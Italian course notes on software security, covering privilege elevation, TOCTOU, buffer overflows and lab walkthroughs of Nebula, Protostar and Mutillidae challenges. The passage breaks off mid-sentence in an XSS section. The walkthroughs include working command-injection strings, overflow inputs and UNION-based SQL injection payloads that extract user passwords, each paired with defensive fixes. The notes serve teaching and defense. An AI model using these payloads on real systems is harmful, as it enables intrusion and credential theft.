#set par(leading: 0.55em, justify: true, linebreaks: "optimized")
#set text(font: "New Computer Modern", lang: "en")
#set heading(numbering: "1. ")
#show raw: set text(font: "Courier New", size: 11pt)
#show raw.where(block: false): box.with(
  fill: luma(240),
  inset: (x: 3pt, y: 0pt),
  outset: (y: 3pt),
  radius: 2pt
)
#show raw.where(block: true): block.with(
  fill: luma(240),
  inset: 10pt,
  radius: 4pt,
)
#show par: set block(spacing: 1em)

#outline(
  indent: auto
)

= Attacchi informatici

Qualsiasi attacco che ha lo scopo di #strong[arrecare danno] ad
un'entità/azienda è un #strong[crimine].

Gli attacchi informatici sono crimini perpetrati tramite l'uso di
#strong[tecnologie digitali].

Le tecnologie digitali possono essere:

- #strong[obiettivo] del crimine;
- #strong[strumento] del crimine;
- #strong[testimoni] del crimine

== Caso dello spam

Lo spam esiste ancora perché allo spammer basta che risponda
positivamente lo 0,0001% dei destinatari per guadagnare dai 7.500\$ ai
12.500\$ al giorno.

== Di chi è la colpa degli attacchi informatici?

Spesso si tende ad accusare infrastrutture e tecnologie che si
utilizzano in Internet.

In realtà Internet è stata progettata per promuovere lo scambio non
ristretto di informazioni accademiche e scientifiche.

Oggi però Internet è un sistema interconnesso dove circolano
#strong[dati sensibili].

== Rischio

Probabilità che una #strong[minaccia] ha di sfruttare una
#strong[vulnerabilità] di una #strong[risorsa] (o #strong[asset]) e
quindi di causare impatti indesiderati.

In alcuni casi il rischio può essere calcolato, tenendo in
considerazione:

- quali sono le possibili minacce e qual è la loro frequenza;
- quali sono le vulnerabilità che queste minacce possono sfruttare

Nel tempo, le vulnerabilità sono aumentate a causa di diversi fattori.

=== Evoluzione dei sistemi informatici

Prima c'erano tante postazioni, non condivise, collegate ad un
mainframe.

Oggi invece:

- ci sono #strong[miliardi] di sistemi collegati ad Internet;
- i terminali sono molto più potenti;
- le reti sono #strong[condivise];
- c'è un'enorme trasmissione di dati

=== Evoluzione delle applicazioni e dei servizi informatici

Prima:

- un'organizzazione aveva bisogno di poche applicazioni per funzionare;
- le informazioni digitalizzate erano poche ed erano pochi anche i
  dipendenti autorizzati ad accedervi

Oggi invece:

- i servizi informatici sono diventati fondamentali per le
  organizzazioni;
- le applicazioni informatiche sono molto più diffuse

Più cose fa un sistema e più è vulnerabile.

=== Evoluzione della complessità dei sistemi informatici

Al giorno d'oggi i sistemi informatici sono molto più complessi rispetto
agli anni precedenti.

Spesso integrano competenze difficilmente conciliabili tra di loro.

=== Altri tipi di vulnerabilità

- bug nel software;
- non vi è educazione allo #strong[sviluppo di software sicuro];
- sviluppare software sicuro richiede tempo e denaro. Non sempre il
  management è disposto a concecerli;
- sistemi non aggiornati

La sicurezza informatica non vende. È una cosa intangibile e nessuno
vuole pagarla.

C'è poco tempo per pensare anche alla sicurezza del software. Si
preferisce metterlo in produzione subito e patcharlo in futuro.

#figure(
  image("assets/b4c126da01fbc6312ddea99f4ea7a76e.png", height: 25%),
  caption: [
    Evoluzione dei sistemi informatici nel tempo
  ]
)

== Attaccanti

Vari termini (a volte usati impropriamente):

- hacker;
- cracker;
- lamer;
- black hat e white hat

Le motivazioni per cui si fa un attacco informatico sono molte e sono
cambiate nel tempo:

#figure(
  image("assets/562c923512515c44a86543a4162a8644.png", height: 25%),
  caption: [
    Motivazioni degli attaccanti
  ]
)

La tipologia più pericolosa di attaccanti è quella degli
#strong[attaccanti interni], perché hanno accesso a molte informazioni
che un esterno non conosce.

== Tempo di sopravvivenza

Un computer non protetto collegato ad Internet subisce nel giro di 1
minuto 150 #strong[tipi] di attacchi diversi.

Nel 2014 in una settimana si sono registrati 379 tipi di attacchi
diversi.

== Vettori d'attacco principali

+ applicativi non aggiornati;
+ malware preso tramite allegati di posta e/o siti web infetti;
+ password banali;
+ phishing;
+ man-in-the-browser;
+ uso di PC e reti condivise (es. PC della biblioteca, reti Wifi aperte)

= Lezione 3 - esecuzione con privilegi elevati

L'elevazione dei privilegi può essere fatta:

- #strong[manualmente], es. tramite `su` o `sudo`;
- #strong[automaticamente] tramite i bit SETUID/SETGID

Problemi dell'elevazione automatica con SETUID/SETGID:

- si ottiene un privilegio enorme (`root` può fare qualsiasi cosa);
- il processo può sfruttare questi privilegi per l'#strong[intera
  esecuzione]

L'elevamento dei privilegi anche quando non se ne ha bisogno costituisce
una #strong[debolezza]. Non è corretto invece parlare di
#strong[vulnerabilità] perché, se un programma è scritto correttamente,
la sola elevazione automatica dei privilegi (anche quando non servono)
non è sufficiente per dare un vantaggio ad un attaccante.

Mitigazioni a queste debolezze: - abbassamento e ripristino dei
privilegi (#strong[privilege drop] e #strong[privilege restore]); -
destrutturazione dei permessi di `root` (#strong[capabilities])

Nei sistemi UNIX, un processo memorizza 3 coppie di credenziali:

- UID e GID #strong[reale] (chi ha lanciato il processo);
- UID e GID #strong[effettivo] (uguali a quelli reali, oppure a quelli
  del creatore del file se i bit SETUID/SETGID sono impostati);
- UID e GID #strong[salvato] (impostabili tramite API C, servono per
  effettuare il #strong[privilege restore])

Il comando `ps -o ruid,rgid,euid,egid <PID>` permette di visualizzare
UID/GUID reali/salvati di un processo.

== API C per implementare privilege drop/restore

- `setuid(uid)` e `getuid()` per impostare/ottenere lo UID
  #strong[reale];
- `seteuid(uid)` e `geteuid()` per impostare/ottenere lo UID
  #strong[effettivo]
- `setresuid(ruid, euid, suid)` per impostare con un'unica chiamata
  tutta la terna UID reale/effettivo/salvato (impostare un UID/GID
  salvato serve per poter effettuare il restore successivamente)

Una volta cambiato lo UID #strong[reale], non è più possibile
modificarlo. Per cambiare #strong[temporaneamente] i permessi si deve
modificare lo UID #strong[effettivo].

=== Esempio di privilege drop/restore

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
    int x;
    uid_t ruid, euid, suid;

    getresuid(&ruid, &euid, &suid); // suid = euid
    
    printf("Before privilege drop:\n");
    printf("ruid: %d, euid: %d, suid: %d\n", ruid, euid, suid);
    
    setresuid(-1, getuid(), -1); // privilege drop
    getresuid(&ruid, &euid, &suid);

    printf("After privilege drop:\n");
    printf("ruid: %d, euid: %d, suid: %d\n", ruid, euid, suid);

    printf("Inserisci il valore di x: ");
    scanf("%d", &x);

    setresuid(-1, suid, -1); // privilege restore
    getresuid(&ruid, &euid, &suid);

    printf("After privilege restore:\n");
    printf("ruid: %d, euid: %d, suid: %d\n", ruid, euid, suid);

    printf("Valore di x: %d.\n", x);
   
    return 0;
}
```

== Inibizione di SETUID/SETGID

=== Opzione `nosuid` per `mount`

Eventuali bit SETUID/SETGID presenti in un file system montato con
quest'opzione vengono #strong[completamente ignorati] dal sistema
operativo.

== Il controllo di Bash

Molte shell moderne, tra cui Bash, ignorano i bit SETUID/SETGID
impostati sul loro eseguibile, allo scopo di evitare attacchi di
#strong[privilege escalation].

Nello specifico, queste shell eseguono un #strong[privilege drop]
immediatamente, abbassando i privilegi reali a quelli effettivi.

Nel caso di Bash, questo meccanismo di difesa si può disattivare
eseguendo Bash con l'opzione `-p`.

== Intercettazione di un processo

Esistono diversi tool (`gdb`, `strace`) che permettono di
#strong[tracciare] un processo (es. a scopi di debug).

Se il processo tracciato ha privilegi superiori a quello tracciante,
l'attaccante può sfruttare il tool di tracciamento per modificare il
codice eseguito dal processo tracciato per eseguire codice arbitrario
come utente privilegiato.

Per proteggersi da questi attacchi, è possibile configurare il proprio
sistema in modo tale che un processo tracciante non possa agganciarsi ad
un processo già in esecuzione (esempio: modifica del parametro del
kernel `kernel.yama.ptrace_scope`).

= Local injection

== Ciclo di vita di una vulnerabilità software

+ vulnerabilità introdotta (es. a causa di un bug);
+ viene rilasciato un exploit;
+ vulnerabilità rilevata dal vendor;
+ vulnerabilità annunciata pubblicamente;
+ aggiornamento delle firme degli anti-virus per rilevare minacce che
  sfruttano questa vulnerabilità;
+ patch rilasciata dal vendor per mitigare/eliminare la vulnerabilità;
+ deployment della patch terminato su tutti i sistemi vulnerabili

Definizioni importanti:

- #strong[zero-day attack]: attacco perpetrato #strong[prima] che si
  conoscesse pubblicamente la vulnerabilità;
- #strong[follow-on attack]: attacco perpetrato #strong[dopo] l'annuncio
  pubblico della vulnerabilità;
- #strong[window of exposure]: finestra in cui il sistema è esposto alla
  vulnerabilità

#figure(
  image("assets/a374ce7b5be698795a7f483392025c81.png"),
  caption: [Timeline di una vulnerabilità software]
)

== Vulnerabilità principali

- mediazione incompleta;
- time to check to time of use;
- code injection

Aspetto in comune: mancata validazione dell'input.

=== Mediazione incompleta

Si ha quando dei dati sensibili, sulla base dei quali vengono fatte
operazioni critiche (es. autenticazione, creazione di una fattura, ecc.)
sono #strong[esposti] e #strong[facilmente modificabili].

Esempio: risultati parziali esposti nella directory `/tmp` $arrow.r$ se
l'utente modifica questi risultati parziali, è in grado di alterare il
risultato finale.

Altro esempio: dati sensibili esposti nell'URL tramite query parameter.

Anche il #strong[buffer overflow] è un esempio di mediazione incompleta,
perché permette ad un utente di modificare lo stato di un programma (es.
cambiando il puntatore alla prossima istruzione da eseguire, al fine di
eseguire codice arbitrario).

Contromisure:

- aggiungere controlli sui dati #strong[prima], #strong[durante] e
  #strong[dopo] aver svolto l'operazione critica;
- riprogettare l'interfaccia dell'applicazione in modo da
  #strong[limitare al minimo] l'input dell'utente;
- riprogettare l'applicazione in modo da non esporre mai dati sensibili

=== Time to check to time of use

Si tratta di malfunzionamenti causati da problemi di
#strong[sincronizzazione], tipici in scenari multiutente e multitasking.

Scenario tipico:

- un'operazione sensibile può essere fatta solo se una certa condizione
  è vera;
- la verifica della condizione avviene #strong[prima] dell'esecuzione
  dell'operazione;
- la condizione diventa falsa #strong[dopo] la verifica, ma prima
  dell'esecuzione dell'operazione

Esempio:

+ un utente cerca di modificare una pagina di Wikipedia;
+ essendo la pagina non bloccata, l'utente riceve l'autorizzazione per
  la modifica;
+ dopo che l'utente ha ricevuto l'autorizzazione, un amministratore
  blocca la pagina;
+ l'utente riesce comunque a modificare la pagina, sfruttando
  l'autorizzazione che aveva ottenuto in precedenza

Altro esempio (contesto Linux):

#figure(
  image("assets/09cfa6f7ecb85bd8dae835e490835013.png"),
  caption: [TOCTOU su Linux]
)

=== Code injection

Tecnica per iniettare #strong[codice arbitrario] in un'applicazione
sfruttando il mancato controllo dell'input (es. SQL injection).

Le tecniche usate per realizzare l'attacco dipendono #strong[sempre]
dalla #strong[tecnologia] utilizzata a livello applicativo.

La causa è sempre la stessa: #strong[mancata validazione dell'input].

=== Buffer overflow

Si tratta di un bug per il quale un programma, scrivendo dati su un
#strong[buffer], eccede la capacità del buffer stesso, andando a
sovrascrivere il contenuto di aree di memoria #strong[adiacenti] al
buffer.

Il buffer overflow è una #strong[vulnerabilità]. Il modo con cui può
essere sfruttata dipende da:

- architettura della macchina;
- sistema operativo;
- regione di memoria (stack o heap)

Il buffer overflow può essere sfruttato per modificare il valore di una
variabile situata vicino al buffer vulnerabile, allo scopo di alterare
il comportamento del programma.

== Nebula - livello 1

=== Attacco

Il programma `flag01` come prima cosa eleva i propri privilegi
utilizzando l'#strong[effective] user/group ID impostati nel file.

#image("assets/6afcd068fd6eaa325e828c60826d34f0.png")

Il file `flag01` ha bit set UID impostato, quindi esegue il comando
`/usr/bin/env echo and now what?` come utente `flag01`.

La funzione C `system()` esegue un comando da shell, invocando
`/bin/sh -c <comando>`. Dal manuale inoltre si scopre una cosa
interessante:

#image("assets/6598835b3f86f5627db888478fad47df.png")

Per riuscire nell'obiettivo di eseguire `/bin/getflag` con utente
`flag01`, dobbiamo fare in modo che il comando
`/usr/bin/env echo and now what?` vada, in un qualche modo, ad eseguire
`/bin/getflag`.

Il comando `/usr/bin/env` va ad eseguire il comando che gli viene
passato come argomento (`echo` in questo caso) in un "ambiente
particolare".

Se leggiamo il manuale di `env`, però, notiamo che in questo caso
l'ambiente con cui viene eseguito `echo` è lo stesso di quello di
partenza, perché nella stringa passata a `system()` non vengono
specificate nè opzioni nè nuove coppie chiave-valore.

Possiamo quindi sfruttare il #strong[path injection]: modifichiamo la
variabile d'ambiente `$PATH` in modo tale che `echo` non punti più
all'eseguibile `/bin/echo` originale, ma a `/bin/getflag`.

+ copiamo il file `/bin/getflag` nella directory `/home/level01`,
  dandogli il nome `echo`;
+ cambiamo la variabile `$PATH` eseguendo da riga di comando
  `PATH=$(pwd):$PATH`;
+ eseguiamo `/home/flag01/flag01`;
+ challenge completata!

=== Difesa

Ci sono almeno 2 vulnerabilità: 
1. l'eseguibile `/home/flag01/flag01` ha bit SETUID \= 1 (cosa fortemente sconsigliata dallo stesso manuale di`system`); 
2. per trovare l'eseguibile `echo` ci si basa sul path corrente, che potrebbe essere stato alterato. Sarebbe molto meglio partire con un environment pulito (`env -i`) oppure (ancora meglio) specificare il percorso assoluto del comando.

Per risolvere la 1° vulnerabilità si può rimuovere il bit SETUID
dall'eseguibile `/home/flag01/flag01` (eseguire
`chmod u-s /home/flag01/flag01` come utente `root`).

Un'altra alternativa è modificare il file `level1.c` in modo da
rilasciare i privilegi prima di eseguire la chiamata a `system`,
applicando questa patch:

```diff
--- level1_original.c   2023-02-07 02:30:19.739399537 -0800
+++ level1_privdrop.c   2023-02-07 02:31:59.659404215 -0800
@@ -14,5 +14,10 @@
   setresgid(gid, gid, gid);
   setresuid(uid, uid, uid);
 
+  // privilege drop before executing system()
+  uid = getuid();
+  
+  setresuid(-1, uid, -1);
+
   system("/usr/bin/env echo and now what?");
 }
```

== Nebula - livello 2

=== Attacco

Il programma: - eleva i propri privilegi, sfruttando il bit SETUID
impostato; - esegue la funzione `asprintf` che crea una stringa
(`buffer`) di dimensione sufficiente per contenere il 2° argomento; -
esegue una chiamata a `system`

Come nel livello precedente, possiamo sfruttare il modo con cui viene
utilizzato l'ambiente. Se facciamo in modo che `getenv("USER")`
restituisca qualcosa in modo tale che la successiva chiamata a
`system()` vada ad eseguire `/bin/getflag`, abbiamo completato la sfida.

Soluzione:

```
level02@nebula:~$ USER="; /bin/getflag"
level02@nebula:~$ /home/flag02/flag02 
about to call system("/bin/echo ; /bin/getflag is cool")

You have successfully executed getflag on a target account
```

=== Difesa

Diverse strategie:

- rimuovere il bit SETUID da `/home/flag02/flag02`;
- eseguire un privilege drop prima della chiamata a `system`;
- se l'obiettivo del programma è recuperare lo username corrente,
  anziché usare l'ambiente tramite la funzione `getenv` (che potrebbe
  essere stato alterato), utilizzare la funzione `getlogin()` (vedi
  `man 3 getlogin`)

== Protostar - stack00

Per sfruttare il buffer overflow dobbiamo raccogliere alcune
informazioni:

- qual è il #strong[sistema operativo] usato?
- qual è l'#strong[architettura] della macchina? È 32 bit o 64 bit?
- qual è il #strong[processore] usato?
- in che modo il programma `stack0` accetta #strong[input]?

Il comando `lsb_release -a` restituisce informazioni sul sistema
operativo:

```
user@protostar:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 6.0.3 (squeeze)
Release:    6.0.3
Codename:   squeeze
```

Il comando `arch` (o `uname -m`) restituisce informazioni
sull'architettura della macchina:

```
user@protostar:~$ arch
i686
user@protostar:~$ uname -m
i686
```

Il file `/proc/cpuinfo` contiene informazioni sul processore:

```
user@protostar:~$ cat /proc/cpuinfo
...
model name  : Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz
...
```

Guardando il sorgente, si nota che le variabili `modified` e `buffer`
sono dichiarate una dopo l'altra. Può essere che anche in memoria siano
una dopo l'altra? Se sì, allora potremmo sfruttare un buffer overflow su
`buffer` per modificare il valore di `modified`.

Affinché questo buffer overflow funzioni, dobbiamo scrivere 68 byte in
`buffer`: - 64 byte (\= 64 caratteri) riempiono `buffer`; - 4 byte (\= 4
caratteri, dimensione di 1 intero in C) riempiono `modified`

Dal manuale di `gets()` si scopre che la funzione NON esegue controlli
di buffer overflow, quindi riusciamo a scrivere in `buffer` quanti byte
ci pare.

Dimostrare che `buffer` e `modified` sono vicine in memoria, e che
soprattutto `buffer` è allocata #strong[prima] di `modified`, è più
complesso.

=== Analisi dello spazio di memoria

Per capire com'è strutturata la memoria nella macchina target
dell'attacco, usiamo il comando `pmap <PID>` (es. `pmap $$`):

```
user@protostar:~$ pmap $$
2114:   /bin/bash
08048000    776K r-x--  /bin/bash
0810a000     20K rw---  /bin/bash
0810f000   1676K rw---    [ anon ]
b7ca6000     28K r--s-  /usr/lib/gconv/gconv-modules.cache
b7cad000     40K r-x--  /lib/libnss_files-2.11.2.so
b7cb7000      4K r----  /lib/libnss_files-2.11.2.so
b7cb8000      4K rw---  /lib/libnss_files-2.11.2.so
b7cb9000     32K r-x--  /lib/libnss_nis-2.11.2.so
b7cc1000      4K r----  /lib/libnss_nis-2.11.2.so
b7cc2000      4K rw---  /lib/libnss_nis-2.11.2.so
b7cc3000     76K r-x--  /lib/libnsl-2.11.2.so
b7cd6000      4K r----  /lib/libnsl-2.11.2.so
b7cd7000      4K rw---  /lib/libnsl-2.11.2.so
b7cd8000      8K rw---    [ anon ]
b7cda000     24K r-x--  /lib/libnss_compat-2.11.2.so
b7ce0000      4K r----  /lib/libnss_compat-2.11.2.so
b7ce1000      4K rw---  /lib/libnss_compat-2.11.2.so
b7ce2000   1492K r----  /usr/lib/locale/locale-archive
b7e57000      4K rw---    [ anon ]
b7e58000   1272K r-x--  /lib/libc-2.11.2.so
b7f96000      4K -----  /lib/libc-2.11.2.so
b7f97000      8K r----  /lib/libc-2.11.2.so
b7f99000      4K rw---  /lib/libc-2.11.2.so
b7f9a000     16K rw---    [ anon ]
b7f9e000      8K r-x--  /lib/libdl-2.11.2.so
b7fa0000      4K r----  /lib/libdl-2.11.2.so
b7fa1000      4K rw---  /lib/libdl-2.11.2.so
b7fa2000    220K r-x--  /lib/libncurses.so.5.7
b7fd9000     12K rw---  /lib/libncurses.so.5.7
b7fe0000      8K rw---    [ anon ]
b7fe2000      4K r-x--    [ anon ]
b7fe3000    108K r-x--  /lib/ld-2.11.2.so
b7ffe000      4K r----  /lib/ld-2.11.2.so
b7fff000      4K rw---  /lib/ld-2.11.2.so
bffeb000     84K rw---    [ stack ]
 total     5972K
```

Notiamo che la memoria di un processo è divisa in diverse aree:

- aree #strong[codice] (permessi `r-x--`);
- aree #strong[dati costanti] (permessi `r----`);
- aree #strong[dati variabili] (permessi `rw---`);
- #strong[stack] (`rw--- [stack]`)

#image("assets/8c5859fff214580fe8d411b8b9f92a76.png")

L'output di `pmap` però non spiega diverse cose:

- dove sono memorizzate `buffer` e `modified`? Sono contigue oppure no?
- cosa sono le aree senza permessi? (`----`);
- cosa sono le aree marcate `[anon]`?

L'allocatore GNU/Linux memorizza le variabili locali (come `buffer` e
`modified`) sullo #strong[stack].

=== Aree di memoria anonime

Sotto allo stack (cioè sopra, guardando l'output di `pmap`) si trova il
#strong[memory mapping segment]. Questo segmento viene utilizzato per
due scopi:

- caricare in memoria il contenuto di un file (es. di una
  #strong[libreria]), in modo da non doverlo leggere tutte le volte dal
  disco;
- mappare zone di memoria di dimensione \> 128 KB quando ne viene
  richiesta l'allocazione tramite funzione `malloc()`

Nell'ultimo caso (viene mappata un'area di memoria e non il contenuto
del file) si parla di #strong[mappatura anonima].

=== Aree con permessi nulli

Il loader dinamico inserisce delle #strong[pagine di guardia] (guard
page) tra l'area codice e l'area successiva al fine di:

- separare il codice dai dati. Spesso il codice delle librerie è
  #strong[condiviso] tra più processi;
- catturare un tentativo di buffer overflow

=== Struttura dello stack

Lo stack è organizzato in #strong[frame]. Ogni volta che viene invocata
una funzione viene creato un nuovo frame per contenere:

- le variabili locali alla funzione;
- i parametri passati alla funzione;
- altre informazioni necessarie per poter eseguire il #strong[ritorno al
  chiamante] una volta che la funzione è terminata

Lo stack cresce #strong[verso gli indirizzi bassi]:

#image("assets/4788f72f4790b3938f5338ceba526403.png")

Il registro #strong[extended base pointer] (EBP) è un puntatore
particolare che punta allo stack frame della funzione attualmente in
esecuzione.

=== Conclusioni

Quindi, se lo stack cresce verso il basso, allora la variabile `buffer`
(dichiarata #strong[dopo] `modified`) sta in un indirizzo più basso.

Possiamo sfruttare quindi queste informazioni per scrivere 65 caratteri
dentro a `buffer`:

```
user@protostar:~$ python -c "print 'a' * 65" | /opt/protostar/bin/stack0
you have changed the 'modified' variable
```

== Protostar - stack01

La sfida sembra molto simile a stack00. Proviamo a vedere cosa succede
se utilizziamo lo stesso input:

```
user@protostar:~$ /opt/protostar/bin/stack1 $(python -c "print 'a' * 65")
Try again, you got 0x00000061
```

Da `man ascii`, scopriamo che in `modified` ci è finito il valore
`0x00000061` perché in ASCII `a` \= `0x61`.

Proviamo a far andare `ab` in `modified`:

```
user@protostar:~$ /opt/protostar/bin/stack1 $(python -c "print 'a' * 65 + 'b'")
Try again, you got 0x00006261
```

L'architettura di Protostar è #strong[little-endian], quindi anche se in
`modified` c'è `ab` dall'output di `stack1` sembra esserci `ba`.

Se quindi l'obiettivo è avere `modified == 0x61626364 == abcd` in
little-endian, dobbiamo dare in input a `stack1` la stringa `dcba`:

```
user@protostar:~$ /opt/protostar/bin/stack1 $(python -c "print 'a' * 64 + 'dcba'")
you have correctly got the variable to the right value
```

= Lezione 5 - remote injection

L'#strong[iniezione remota] avviene mediante un vettore d'attacco
#strong[remoto]. A differenza dell'iniezione locale, non si ha a
disposizione una shell sulla macchina vittima.

Il contesto in cui si svolge l'iniezione remota prevede 2 asset
principali:

- un #strong[client];
- un #strong[server]

Tipicamente client e server interagiscono tramite protocolli dello stack
TCP/IP.

Nell'iniezione remota, le richieste che il client fa al server
contengono iniezioni per uno specifico linguaggio (es. SQL). Questi dati
possono essere inoltrati dal server ad altri asset (es. database)
tramite altri protocolli applicativi.

== Nebula - livello 7

La directory `/home/flag07` contiene alcuni file molto interessanti:

```
level07@nebula:/home/flag07$ ls -l
total 5
-rwxr-xr-x 1 root root  368 2011-11-20 21:22 index.cgi
-rw-r--r-- 1 root root 3719 2011-11-20 21:22 thttpd.conf
```

- `index.cgi` è lo script CGI Perl da eseguire;
- `thttpd.conf` è il file di configurazione di `thttpd`, un server web

Lo script `index.cgi` può ricevere input in 2 modi:

- tramite query parameter in una richiesta HTTP;
- tramite riga di comando

Esempio:

```
level07@nebula:/home/flag07$ ./index.cgi "Host=1.1.1.1"
Content-type: text/html

<html><head><title>Ping results</title></head><body><pre>PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
64 bytes from 1.1.1.1: icmp_req=1 ttl=63 time=15.8 ms
64 bytes from 1.1.1.1: icmp_req=2 ttl=63 time=15.1 ms
64 bytes from 1.1.1.1: icmp_req=3 ttl=63 time=14.3 ms

--- 1.1.1.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2213ms
rtt min/avg/max/mdev = 14.321/15.105/15.853/0.633 ms
</pre></body></html>
```

Lo scopo del gioco è sempre quello di eseguire `/bin/getflag`.

Provando una semplice iniezione locale del tipo
`Host=1.1.1.1; /bin/getflag` non si ottiene nulla. Sembrerebbe che il
comando `/bin/getflag` venga proprio ignorato. Bisogna capire meglio
come Perl interpreta gli argomenti che gli arrivano.

Dal #link("https://metacpan.org/pod/CGI")[manuale di Perl], si scopre
che la funzione `param()` restituisce il 1° elemento se il valore del
parametro è una lista.

In più si scopre anche che il carattere `;` fa da separatore (vedi
sezione `-newstyle_urls`).

`index.cgi` interpreta quindi `Host=1.1.1.1; /bin/getflag` come una
lista di 2 parametri e restituisce soltanto il 1°.

Possiamo provare ad #strong[URL-escapare] i caratteri `;` e `/`:

```
level07@nebula:/home/flag07$ ./index.cgi "Host=1.1.1.1%3B%20%2Fbin%2Fgetflag"
Content-type: text/html

<html><head><title>Ping results</title></head><body><pre>PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
64 bytes from 1.1.1.1: icmp_req=1 ttl=63 time=15.3 ms
64 bytes from 1.1.1.1: icmp_req=2 ttl=63 time=42.2 ms
64 bytes from 1.1.1.1: icmp_req=3 ttl=63 time=15.0 ms

--- 1.1.1.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 15.017/24.187/42.233/12.761 ms
getflag is executing on a non-flag account, this doesn't count
</pre></body></html>
```

Abbiamo fatto un passo in avanti: `/bin/getflag` ora viene eseguito, ma
non con i permessi di `flag07`.

Idea: finora abbiamo sempre eseguito `index.cgi` da riga di comando.
Cosa succede se invece lo eseguiamo tramite browser (e.g.~`curl`)?

Problema: esiste un servizio che espone `index.cgi`? Risposta:
sembrerebbe di sì a guardare il file `thttpd.conf`:

```
# Specifies an alternate port number to listen on.
port=7007
...
# Specifies what user to switch to after initialization when started as root.
user=flag07
```

Il servizio sembrerebbe anche essere in ascolto:

```
level07@nebula:/home/flag07$ netstat -46 -tln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
...   
tcp6       0      0 :::7007                 :::*                    LISTEN
```

Quindi il comando per riuscire nell'attacco è:

```
wget -O- http://localhost:7007/index.cgi?Host=1.1.1.1%3B%20%2Fbin%2Fgetflag
```

== SQL injection

Si parla di SQL injection quando un attaccante è in grado di inserire
uno o più #strong[comandi SQL] manipolando l'input ricevuto
dall'applicazione.

Tipici obiettivi:

- autenticarsi senza avere le credenziali di accesso;
- visualizzare, modificare e/o cancellare dati senza averne diritto

Per capire se un server è vulnerabile a SQLi, si analizzano le risposte

- sia in caso di richiesta legittima, non maliziona;
- sia in caso di richiesta volutamente non legittima (molto spesso i
  messaggi d'errore contengono informazioni molto interessanti)

Queste operazioni permettono di eseguire un #strong[service
fingerprinting], ovvero ottenere informazioni sul server (versione, DBMS
utilizzato, ecc.).

Queste operazioni prendono il nome di #strong[fuzz testing] (invio di
richieste anomale con l'obiettivo di scoprire dei
#strong[malfunzionamenti]).

Tecniche base per creare richieste sintatticamente non corrette:

- aggiungere dei #strong[commenti] in modo da tagliare il resto della
  query;
- aggiungere una #strong[tautologia] che rende sempre vera la query (es.
  `OR 1 = 1`);
- aggiungere un #strong[comando SQL] (es. `; DROP TABLE users`)

=== Mutillidae II - OWASP 2017 \> A1 Injection (SQL) \> SQLi Extract
Data \> User Info (SQL)

Per prima cosa eseguiamo un'operazione di #strong[service
fingerprinting] per capire qual è il DBMS utilizzato.

Primo tentativo: inserire `'--` nel campo Password:

#image("assets/671b7775f75b7c4aa10515e6810342f6.png")

Il DBMS utilizzato è MySQL. In più ci viene mostrata in chiaro la query
che viene eseguita:

```sql
SELECT * FROM accounts WHERE username='asd' AND password=''--'
```

==== Primo tentativo: attacco basato su tautologia

Inserendo il valore `' OR 1=1 --` nel campo Username, possiamo ottenere
l'elenco degli utenti.

Problema: l'SQLi basata su tautologia ha diversi limiti:

- non permette di conoscere la struttura di una query SQL (campi
  selezionati e relativo tipo);
- non permette di selezionare altri campi rispetto a quelli usati dalla
  query;
- non permette di eseguire comandi arbitrari SQL

==== Secondo tentativo: operatore `UNION`

Con questo operatore possiamo unire il risultato di più query, a patto
che le due query restituiscano lo stesso numero di colonne.

Proviamo quindi ad inserire, in coda alla query eseguita dal server, una
query banale del tipo `SELECT 1`.

Dopo diversi tentativi, scopriamo che la query corretta è
`SELECT 1, 2, 3, 4, 5, 6, 7`, ovvero la tabella `accounts` ha 7 campi.
Per ottenere questo risultato bisogna inserire nel campo Username il
valore `' UNION SELECT 1, 2, 3, 4, 5, 6, 7  --`:

#image("assets/9b9ce5c8c128145e803d8a47b6305ac5.png")

In più scopriamo che il server va poi a stampare il 2°, 3° e 4° campo di
questa tabella.

Possiamo sfruttare quest'informazione per andare più a fondo nel service
fingerprinting, per esempio facendogli stampare: - versione di MySQL; -
utente del DB che esegue la query; - macchina su cui si trova il DBMS

Valore del campo Username:
`' UNION SELECT 1, @@version, CURRENT_USER, @@hostname, 5, 6, 7  --`:

#image("assets/df3ac6050fa5f8da21048df697912dfd.png")

- versione 8.0.30;
- username: `root`;
- hostname: `d9ec5ffcd5a5` (ID del container Docker che esegue il DB)

Ricaviamo poi altre informazioni sulla tabella `accounts`. - come si
chiamano gli altri 4 campi che non vengono mostrati nell'output (1°, 5°,
6° e 7°)?

Dal manuale di MySQL scopriamo che la tabella virtuale `columns` nel DB
`information_schema` contiene informazioni su tutte le colonne delle
varie tabelle.

Query:

```sql
SELECT column_name
FROM information_schema.columns
WHERE table_name = 'accounts'
```

Contenuto del campo di input:

```
' UNION SELECT 1, column_name, 3, 4, 5, 6, 7 FROM information_schema.columns WHERE table_name = 'accounts' -- 
```

Prossimo step: uso di `concat()` per stampare su un'unica riga
#strong[tutte] le informazioni degli utenti (non solo username, password
e signature).

```sql
SELECT CONCAT(cid, ":", firstname, ":", is_admin, ":", lastname, ":", mysignature, ":", password, ":", username, ":")
FROM accounts
```

Contenuto del campo di input:

```
' UNION SELECT 1, CONCAT(cid, ":", firstname, ":", is_admin, ":", lastname, ":", mysignature, ":", password, ":", username, ":"), 3, 4, 5, 6, 7 FROM accounts -- 
```

=== Mitigazione: prepared statement

La mitigrazione più potente all'SQLi sono i #strong[prepared statement].

Oltre alla sicurezza, i prepared statement aumentano anche le
#strong[prestazioni] (la query è compilata una sola volta).

== Cross-site scripting (XSS)

Vulnerabilità che coinvolge più entità:

- siti Internet;
- tecnologie web;
- linguaggi di scripting

L'XSS è una delle modalità d'attacco più diffuse (al 3° posto nella top
10 OWASP 2021).

È condotto mediante servizi Web che accettano in input tag HTML di
scripting (es. `<script>`).

L'XSS si distingue di 2 tipologie:

- XSS #strong[reflected]: l'input malevolo proviene dall'utente e viene
  utilizzato per generare una pagina dinamica che viene restituita allo
  stesso utente. Questa tipologia non prevede la memorizzazione di
  informazioni sul sito web vulnerabile;
- XSS #strong[stored]: la pagina malevola è salvata sul server e ciò può
  avere effetto su #strong[chiunque] ci finisca sopra

=== XSS reflected

L'attaccante scopre che una pagina HTML accetta in input anche il tag
